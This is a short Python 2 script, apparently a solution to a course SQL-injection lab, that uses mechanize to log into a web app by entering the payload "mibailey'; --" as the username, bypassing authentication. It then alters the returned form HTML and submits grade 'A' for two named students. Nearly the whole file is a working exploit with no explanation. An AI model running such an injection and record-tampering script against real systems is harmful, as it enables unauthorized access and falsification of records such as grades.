import re
import mechanize

br = mechanize.Browser()
br.open("http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/login?came_from=http%3A%2F%2Fec2-54-245-12-74.us-west-2.compute.amazonaws.com%2Fsqlinject1%2F")
# follow second link with element text matching regular expression
#response1 = br.follow_link(text_regex=r"cheese\s*shop", nr=1)
assert br.viewing_html()

br.select_form(nr=0)
# Browser passes through unknown attributes (including methods)
# to the selected HTMLForm.
br["login"] = "mibailey\'; --" # (the method here is
# Submit current form. Browser calls .close() on the current response on
# navigation, so this closes response1
response2 = br.submit()
br.select_form(nr=0)
# print currently selected form (don't call .submit() on this, use br.submit())
print br.form

html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project1\"> project1 </option> </select>")
response = mechanize.make_response(
		    html, [("Content-Type", "text/html")],
		    "http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)
print "Printing br[project]"
print br["project"]

br["uniqname"] = "sklarj"
br["project"] = ["project1"]
br["grade"] = "A"
response3 = br.submit()
#print br.form


html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project1\"> project1 </option> </select>")
response = mechanize.make_response(
		    html, [("Content-Type", "text/html")],
		    "http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject1/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)
print "Printing br[project]"
print br["project"]

br["uniqname"] = "lhejazi"
br["project"] = ["project1"]
br["grade"] = "A"
response3 = br.submit()


"""
response3 = br.back() # back to cheese shop (same data as response1)
# the history mechanism returns cached response objects
# we can still use the response, even though it was .close()d
response3.get_data() # like .seek(0) followed by .read()
response4 = br.reload() # fetches from server

for form in br.forms():
		print form
		# .links() optionally accepts the keyword args of .follow_/.find_link()
		for link in br.links(url_regex="python.org"):
		print link
		br.follow_link(link) # takes EITHER Link instance OR keyword args
		br.back()
		"""
